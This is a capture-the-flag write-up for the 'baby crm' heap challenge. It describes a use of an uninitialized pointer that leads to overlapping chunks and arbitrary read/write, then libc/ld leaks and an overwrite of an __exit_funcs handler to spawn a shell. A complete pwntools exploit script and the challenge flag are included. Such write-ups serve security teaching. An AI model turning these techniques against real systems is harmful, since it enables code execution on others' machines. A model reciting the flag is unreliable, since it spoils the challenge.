# baby crm

## Challenge

A C++ application which lets us add and manage customers and orders.

## Solution

The help messages will free an uninitialized pointer from the stack.
We can use this to free a customer.

If we then create an order for a different customer, the order description with overlap with the freed customer.

If we again free the same customer and create a new one, it will overlap with the freed customer and the order.

Using the order, we can read and write data in the customer struct.

We can achieve an arbitrary read/write by creating a fake vector or orders, allowing us to manipulate the address of a fake order description.

We can leak the libc address by creating a large string that gets freed into a fastbin, then reading the pointer.

Unfortunately, malloc and free hooks are removed in this version.

Leaking a stack pointer through the libc environ is an option
We could use this to write a ropchain on the stack.
Unfortunately, I could not get this to work on the remote.

Instead, I leaked the ld-linux address from a pointer in libc.
This allowed me to find the address of `_dl_fini`, which could be used to determine the xor key used in the libc `__exit_funcs`.
From there, I overwrite one of the exit handlers with `system("/bin/sh")` to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2023.ductf.dev --port 30014 baby-crm
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'baby-crm')
libc = ELF('libc.so.6')
ld = ELF('ld-linux-x86-64.so.2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '2023.ductf.dev'
port = int(args.PORT or 30014)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env={'LD_PRELOAD': libc.path}, *a, **kw)
    else:
        return process([exe.path] + argv, env={'LD_PRELOAD': libc.path}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def new_customer(name):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', name)

def add_order(c_idx, value):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', c_idx)
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', value)

def edit_customer_name(c_idx, name):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', c_idx)
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', name)

def edit_order(c_idx, o_idx, description):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', c_idx)
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', o_idx)
    io.sendafter(b': ', description)
    if len(description) < 0x50:
        io.send(b'\n')

def leak_desc(c_idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', c_idx)
    io.recvuntil(b'Value: ')
    io.recvuntil(b'Description: \n')
    return io.recv(0x50)

def leak_name(c_idx, n):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', c_idx)
    io.recvuntil(b'Name: ')
    return io.recv(n)

def order_help():
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'> ', b'1')

new_customer(b'0')
new_customer(b'1')

# overlap order
add_order(b'0', b'0')
order_help()
add_order(b'1', b'0')

# overlap customer
add_order(b'0', b'0')
order_help()
new_customer(b'2')

leak = leak_desc(b'1')
leak_arr = [unpack(leak[i:i+8]) for i in range(0, len(leak), 8)]
print([hex(i) for i in leak_arr])

def arb_read(addr, n):
    if addr & 1 == 1:
        raise Exception("arb_read addr & 1 cannot be set")
    if b'\n' in pack(addr):
        raise Exception("arb_read addr cannot contain newlines")
    edit_order(b'1', b'0', pack(addr) + pack(n) + leak[0x10:])
    return leak_name(b'0', n)

def arb_write(addr, content):
    edit_order(b'1', b'0', flat(
        [
            leak_arr[:6],
            0,
            leak_arr[5]+8,
            addr,
            leak_arr[5]-0x10,
        ],
    ))
    edit_order(b'2', b'0', content)

new_customer(b'3')
edit_customer_name(b'3', b'a'*0x500)
edit_customer_name(b'3', b'a')

libc.address = unpack(arb_read(leak_arr[5] + 0xb08, 8)) - 0x219ce0
print("libc: " + hex(libc.address))
print(arb_read(libc.address, 8))

x = arb_read(libc.address + 0x219000, 800)
x = [hex(unpack(x[i:i+8])) for i in range(0, len(x), 8)]

ld.address = unpack(arb_read(libc.address + 0x219010, 8)) - 0x15c60
print("ld: " + hex(ld.address))
print(arb_read(ld.address, 8))

exit_funcs = libc.address + 0x21af00
dl_fini = ld.address + 0x6040

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

encrypted_dl_fini = unpack(arb_read(exit_funcs + 0x138, 8))
key = ror(encrypted_dl_fini, 0x11, 64) ^ dl_fini

arb_write(exit_funcs + 0x138, flat([encrypt(libc.sym['system'], key), next(libc.search(b'/bin/sh'))]))

io.sendlineafter(b'> ', b'5')

io.interactive()
```

## Flag

```
DUCTF{0u7_0f_5c0p3_0u7_0f_m1nd}
```